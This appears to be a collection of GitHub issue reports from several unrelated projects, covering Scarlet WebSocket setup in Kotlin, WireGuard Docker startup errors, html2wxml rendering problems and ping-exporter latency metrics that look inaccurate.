    return Scarlet(protocol, configuration).create(T::class.java)
}
``` When we add implementation 'com.tinder.scarlet:scarlet:0.1.9' to gradle , that does not support MoshiMessageAdapter.Factory() and RxJava2StreamAdapter.Factory() for use these what should we import?? Trying to test connect to my ws, but server does not see any connection.
I think i miss something, could u tell me what did i miss?
```
class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        Connection.connect()
    }
}

object Connection {
    fun connect() {
//        val moshi = Moshi.Builder()
//            .add(MoshiAdapters())
//            .add(KotlinJsonAdapterFactory())
//            .build()

        val okHttpClient = OkHttpClient.Builder()
            .readTimeout(0, TimeUnit.MILLISECONDS)
            .build()

        val protocol = OkHttpWebSocket(
            okHttpClient,
            OkHttpWebSocket.SimpleRequestFactory(
                { Request.Builder().url("ws://someURL").build() },
                { ShutdownReason.GRACEFUL }
            )
        )

        val configuration = Scarlet.Configuration(
//            messageAdapterFactories = listOf(MoshiMessageAdapter.Factory(moshi)),
            streamAdapterFactories = listOf(RxJava2StreamAdapterFactory())
        )

        val scarletInstance = Scarlet(protocol, configuration)

        val webSocketService = scarletInstance.create<WebSocketService>()

        webSocketService.observeWebSocketEvent()
            .observeOn(Schedulers.io())
            .subscribe({
                Timber.d("connected to web socket")
            })


    }
}

interface WebSocketService {
    @Receive
    fun observeWebSocketEvent(): Flowable<WebSocketEvent>
}
``` Lifecycle module implement some other modules but not use it. 

For example I save 1mb just exclude all modules, which I don't use, but lifecycle implement. 
 ```
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-message-adapter-builtin'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-message-adapter-jackson'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-message-adapter-moshi'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-message-adapter-protobuf'

        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-stream-adapter-builtin'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-stream-adapter-coroutines'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-stream-adapter-rxjava'

        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-protocol-mqtt'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-protocol-socketio-client'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-protocol-socketio-mockserver'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-protocol-sse-okhttp'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-protocol-stomp'
        exclude group: 'com.github.tinder.scarlet', module: 'scarlet-protocol-websocket-mockserver'
```

All work fine after this.
And when use firebase-in-message and scarlet with lifecycle you have @aaaldo 's problem. (protobuf conflict dependencies) I tried to use scarlet (0.16 and 0.17) and I having an issue when proguard is enabled.
Are there any specific rules for that? There is a basic entity of the socket response that differs in the content of the data field and the value of the endpoint field. For exmple. First is a payment structure:
`{
  "endpoint": "updates.payments", 
  "data": {
    "payments": [
      {
        "payment_status": "success",
        //...other fields...
        "currency": {
          "decimal_places": 2,
          "currency_code": "GBP",
          "currency_name": "UK Sterling"
        }
      }
    ]
  }
}`
And message structure: 
`{
  "endpoint": "updates.messages", 
  "data": {
    "messages": [
      {
        "message_status": "send_success",
        //other fields
        "text":"blah blag blah"
      }
    ]
  }
}`

In SocketInterface i have next code: 
`interface SocketInterface {

    @Receive
    fun subscribeToMessages(): Flowable<PushMessage<MessagesData>>

    @Receive
    fun subscribeToPayments(): Flowable<PushMessage<PaymentData>>
}`

And PushMessage model see this:
`
data class PushMessage<T>(
        @SerializedName("endpoint") val method: String,
        @SerializedName("data") val data: T
)

data class MessagesData(
        @SerializedName("messages") val messages: List<ChatMessage>
)

data class PaymentData(
        @SerializedName("payments") val payments: List<BaseTransactionNet>
)
`

By subscribing to both events, I receive two events if I receive one of them. 
Is there any way to fix it? Can someone please give me an example on how to use kotlin coroutines with scarlet?
Like how to set it up and how to "Observe" the data etc..
Thank you I've started using Scarlet this week and I've noticed that the WebSocket connection fails and a new one is started every minute or so. Is there an easy way to keep the connection open by sending a ping instead of re-connecting every time?

I'm using version 0.1.7. i'm newbie in programmingso it's hard for me to make own app with dependecy ijections.
Is there any example how to use Scarlet without dependency injection?
Also in this [`example`](https://medium.com/tinder-engineering/taming-websocket-with-scarlet-f01125427677) there is Scarlet.Builder() 
`const val GDAX_URL = "wss://ws-feed.gdax.com"
val BACKOFF_STRATEGY = ExponentialWithJitterBackoffStrategy(RETRY_BASE_DURATION, RETRY_MAX_DURATION)
val scarlet = Scarlet.Builder()
	.webSocketFactory(okHttpClient.newWebSocketFactory(GDAX_URL))
	.addMessageAdapterFactory(MoshiMessageAdapter.Factory())
	.addStreamAdapterFactory(RxJava2StreamAdapter.Factory())
	.backoffStrategy(BACKOFF_STRATEGY)
	.lifecycle(createAppForegroundAndUserLoggedInLifecycle())
	.build()`
Scarlet.Configuration(), so how should i use it now?
<---------->
135646314
How do I start it:
```
ln -s $PWD/server.conf /etc/wireguard/wg0.conf
docker run -it --rm --cap-add net_admin --cap-add sys_module \
    --name wireguard \
    -v /etc/wireguard:/etc/wireguard -v /lib/modules:/lib/modules \
    -p 51820:51820/udp activeeos/wireguard-docker
```
Error message:
```
Fri Mar 29 07:13:53 UTC 2019: Starting Wireguard
Warning: `/etc/wireguard/wg0.conf' is world accessible
[#] ip link add wg0 type wireguard
[#] wg setconf wg0 /dev/fd/63
[#] ip link set mtu 1420 up dev wg0
[#] wg set wg0 fwmark 51820
[#] ip -4 route add 0.0.0.0/0 dev wg0 table 51820
[#] ip -4 rule add not fwmark 51820 table 51820
[#] ip -4 rule add table main suppress_prefixlength 0
sysctl: setting key "net.ipv4.conf.all.rp_filter": Read-only file system
sysctl: setting key "net.ipv4.conf.default.rp_filter": Read-only file system
sysctl: setting key "net.ipv4.conf.eth0.rp_filter": Read-only file system
sysctl: setting key "net.ipv4.conf.lo.rp_filter": Read-only file system
sysctl: setting key "net.ipv4.conf.wg0.rp_filter": Read-only file system
``` Hi,
I run an openvpn server in docker with Tunnelblick on my mac. 

I'm curious to give this a shot. But the things is, I don't understand the README where things should run. On the server versus the client.

Thanks! I used this docker on a Ubuntu 16.04 machine,I have no idea what should I do?
I copied the configuration files from a wrieguard file from a Cento 7 which is wireguard working there,

>$ ls
>client.conf  cprivatekey  cpublickey  sprivatekey  spublickey  wg0.conf


and I tried the command which is

>docker run -it --rm --cap-add net_admin --cap-add sys_module \
 >     -v /etc/wireguard:/etc/wireguard -v /lib/modules:/lib/modules \
 >      -p 5555:5555/udp activeeos/wireguard-docker

then I have such a concequence:

 > Good news! Module version 0.0.20181218 for wireguard.ko
 > exactly matches what is already found in kernel 4.4.0-21-generic.
 > DKMS will not replace this module.
 > You may override by specifying --force.

 > depmod.......

 > DKMS: install completed.
 > Setting up wireguard-tools (0.0.20181218-wg1~xenial) ...
 > Setting up wireguard (0.0.20181218-wg1~xenial) ...
 > Processing triggers for libc-bin (2.23-0ubuntu10) ...
 > Processing triggers for systemd (229-4ubuntu21.2) ...
 > Processing triggers for menu (2.1.47ubuntu1.16.04.1) ...
 > Sat Jan 19 06:00:57 UTC 2019: Starting Wireguard
 > Usage: wg-quick [ up | down | save ] [ CONFIG_FILE | INTERFACE ]

   > CONFIG_FILE is a configuration file, whose filename is the interface name
   > followed by `.conf'. Otherwise, INTERFACE is an interface name, with
   > configuration found at /etc/wireguard/INTERFACE.conf. It is to be readable
   > by wg(8)'s `setconf' sub-command, with the exception of the following additions
   > to the [Interface] section, which are handled by wg-quick:
 > 
  >  - Address: may be specified one or more times and contains one or more
  >    IP addresses (with an optional CIDR mask) to be set for the interface.
  >  - DNS: an optional DNS server to use while the device is up.
   > - MTU: an optional MTU for the interface; if unspecified, auto-calculated.
  >  - Table: an optional routing table to which routes will be added; if
  >    unspecified or `auto', the default table is used. If `off', no routes
  >    are added.
 >   - PreUp, PostUp, PreDown, PostDown: script snippets which will be executed
  >    by bash(1) at the corresponding phases of the link, most commonly used
 >     to configure DNS. The string `%i' is expanded to INTERFACE.
 >   - SaveConfig: if set to `true', the configuration is saved from the current
 >     state of the interface upon shutdown.
 > 
 > See wg-quick(8) for more info and examples.


<---------->
135846537
For example: hiper baidu.com, it's ok. However, hiper qq.com, It's nothing result.  求一个带cookie 调用的例子，目前带了cookies 之后无响应，无报错 求一个带cookie 调用的例子，目前带了cookies 之后无响应，无报错 你好，能否支持electron客户端的性能测试？
<---------->
136035181
Hello, after trying to use your plugin (example project) I realized it does not do the autorization correctly so I am not able to test it. I'm using a Oneplus 6T with OxygenOs version 9.0.5.
When I perform the click to the button with the label "Autorize Health", the app shows a dialog  to choose an account, I press my gmail and then dialog disappear but the Authorized boolean is still false and never true.
<---------->
136292961
![image](https://user-images.githubusercontent.com/23035615/57205301-6642d180-6ff0-11e9-91e6-850be07a4e9e.png)
 html2wxml的服务器好像炸了，微信小程序渲染不出来文章。 需求：富文本中放video，由于html2wxml组件异步问题和video层级问题，下单按钮即使用cover-view放在富文本wxml后面依然被遮挡。
我的处理：
![image](https://user-images.githubusercontent.com/28852578/50954837-7ccd9600-14f2-11e9-8e7e-b60928930e6c.png)
加了一行代码，让页面知道富文本data以渲染，然后再渲染cover-view虽然有点闪动，至少解决了遮挡问题，如果大神有更好的方案，希望完善并告知一下哈
 <pre class="has">
<code class="language-vbscript">for (var i = 0; i &lt; oLis.length; i++) {
        oLis[i].index = i;
        oLis[i].onclick = function () {
            var _this = this;
            for (var k = 0; k &lt; oImgs.length; k++) {
                if (k != _this.index) {
                    oImgs[k].className = null;
                }
            }
            oImgs[_this.index].className = "move move" + (_this.index + 1);
        }
    }</code></pre> PHP 版本的 element2array 函数貌似在一些配置较低的服务器上会出现死循环造成阻塞，同样一个微信公众号链接在本地就可以解析为数组，在服务器上就会一直等待。 <pre class="has">
<code class="language-vbscript">for (var i = 0; i &lt; oLis.length; i++) {
        oLis[i].index = i;
        oLis[i].onclick = function () {
            var _this = this;
            for (var k = 0; k &lt; oImgs.length; k++) {
                if (k != _this.index) {
                    oImgs[k].className = null;
                }
            }
            oImgs[_this.index].className = "move move" + (_this.index + 1);
        }
    }</code></pre> 在pre标签中<>中的内容不会渲染出来

[详细代码](https://github.com/baichen99/my_issue)

![](https://s2.ax1x.com/2019/05/09/EctyjO.png) 在pre标签中<>中的内容不会渲染出来

[详细代码](https://github.com/baichen99/my_issue)

![](https://s2.ax1x.com/2019/05/09/EctyjO.png)   swan.request({
                        url: 'https://www.qwqoffice.com/html2wxml/',
                        data: data,
                        method: 'POST',
                        header: {
                            'content-type': 'application/x-www-form-urlencoded'
                        },
返回的数据 模拟器和真机不一致   真机器 返回的代码片数据 是 text 
数据是下面
<pre class="has">
<code class="language-vbscript">for (var i = 0; i &lt; oLis.length; i++) {
        oLis[i].index = i;
        oLis[i].onclick = function () {
            var _this = this;
            for (var k = 0; k &lt; oImgs.length; k++) {
                if (k != _this.index) {
                    oImgs[k].className = null;
                }
            }
            oImgs[_this.index].className = "move move" + (_this.index + 1);
        }
    }</code></pre>


请尽快解决一下 我想要html显示语法高亮，怎么做才能让它不解析html代码，同时显示html的语法高亮呢？ 我想要html显示语法高亮，怎么做才能让它不解析html代码，同时显示html的语法高亮呢？ 给text组件添加下selectable='true',属性支持文本内容可复制；    <pre><?php echo 12321; ?></pre>
这样传入内容无法解析

<pre>echo 12321; </pre>
这样解析正常

对<?php标签不兼容吗？
<---------->
136316580
Hello,

I think that incorrect values are sometimes reported by `ping-exporter`. Let me show you by this example:
```
# ping -q -c 1000 -i .1 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.

--- 127.0.0.1 ping statistics ---
1000 packets transmitted, 1000 received, 0% packet loss, time 101982ms
rtt min/avg/max/mdev = 0.017/0.034/0.326/0.019 ms
```
Average latency doesn't exceed 0.3ms in the command above.

Now if we request same data from `ping-exporter` results are different:
```
# for i in {1..100}; do curl -s 127.0.0.1:9346/ping?target=127.0.0.1 | grep ping_times_max; done
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 8
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 17
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 3
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 2
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 6
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 3
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 10
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 3
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 3
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 2
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 2
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 8
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 6
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 29
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 6
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 5
```
As can be seen from the curl command above, maximum latency is mostly reported as 0 ms, but varies up 29ms to localhost:
![image](https://user-images.githubusercontent.com/19568035/60249718-a5412500-98c5-11e9-9d67-813ffb0ee36b.png) Hello,

Running `promtool check metrics` against latest version of `ping exporter`:
```
$ curl -s http://exporter:9346/ping?target=example | promtool check metrics
ping_packets_total non-counter metrics should not have "_total" suffix
ping_times_max no help text
ping_times_min no help text
```

```
$ promtool --version
promtool, version 2.13.0 (branch: HEAD, revision: 6ea4252299f542669aca11860abc2192bdc7bede)
  build user:       root@f30bdad2c3fd
  build date:       20191004-11:25:34
  go version:       go1.13.1
```

It is also generally recommended to report time in seconds, instead of milliseconds. Hello,

I receive this log when running a container :

Nov 04 09:27:37.114 INFO Starting ping-exporter 0.3.1
Nov 04 09:27:37.114 INFO Using settings: listen address: [::]:9346, preferred protocol: v4, resolver: system, default number of ICMP packets: 5, maximum number of ICMP packets: 30, timeout for each ICMP packet: 1000 ms, maximum timeout for each ICMP packet: 10000 ms, resolve timeout: 1000 ms, maximum resolve timeout: 10000 ms.
Nov 04 09:27:37.118 ERRO Server error: error creating server listener: Address family not supported by protocol (os error 97)
Nov 04 09:27:37.118 INFO Exiting

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=18.04
DISTRIB_CODENAME=bionic
DISTRIB_DESCRIPTION="Ubuntu 18.04.3 LTS"
NAME="Ubuntu"
VERSION="18.04.3 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.3 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic

Command to start : 
sudo docker run -d -p 9346:9346 --name=ping-exporter ping-exporter

Working fine under ubuntu : 14.04 Hello,

I think that incorrect values are sometimes reported by `ping-exporter`. Let me show you by this example:
```
# ping -q -c 1000 -i .1 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.

--- 127.0.0.1 ping statistics ---
1000 packets transmitted, 1000 received, 0% packet loss, time 101982ms
rtt min/avg/max/mdev = 0.017/0.034/0.326/0.019 ms
```
Average latency doesn't exceed 0.3ms in the command above.

Now if we request same data from `ping-exporter` results are different:
```
# for i in {1..100}; do curl -s 127.0.0.1:9346/ping?target=127.0.0.1 | grep ping_times_max; done
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 8
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 4
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 17
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 1
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
ping_times_max{count="10", ip="127.0.0.1", ping_timeout="100", protocol="v4", resolve_timeout="50", target="127.0.0.1"} 0
